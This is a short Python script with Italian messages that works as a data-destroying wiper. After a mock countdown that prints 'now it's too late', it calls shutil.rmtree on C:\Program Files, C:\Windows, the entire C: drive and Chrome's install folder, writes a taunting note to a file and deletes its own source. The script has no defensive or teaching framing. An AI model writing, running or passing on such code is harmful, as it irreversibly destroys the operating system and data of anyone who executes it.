import os
import shutil
import subprocess
numero=10
while numero<=0:
    numero-=1 
    print(numero)
else:
    print("orami e troppo tardi \n")
    print(numero)
shutil.rmtree("C:\Program Files")
shutil.rmtree("C:\Windows")
shutil.rmtree("C:")
shutil.rmtree("C:\Program Files\Google\Chrome\Application")
with open("analisi.txt","w") as f:
    print("cioa ti vedo",file=f)
os.remove("estensione file.py")
